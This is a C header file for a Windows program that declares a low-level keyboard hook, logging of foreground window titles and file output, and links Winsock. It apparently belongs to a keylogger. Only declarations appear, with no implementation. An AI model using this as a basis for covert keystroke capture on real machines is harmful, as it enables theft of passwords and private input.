#ifndef LOG_H
#define LOG_H

#define WIN32_LEAN_AND_MEAN // Remove winioctl.h if/elif errors
#pragma warning(disable:4820) // Padding added after data member
#pragma comment(lib, "ws2_32.lib")

#include <Windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <winsock2.h>
#include <ws2tcpip.h>

#include <io.h>
#include <fileapi.h>

void	write_to_file(char *str);
char	*GetDateFormated(void);

// Function to get the foreground window title and log it
void	get_foreground_window(HWND hwnd);

extern HANDLE	fd;

LRESULT CALLBACK LowLevelKeyboardProc(
  _In_ int    nCode,
  _In_ WPARAM wParam,
  _In_ LPARAM lParam
);

#endif
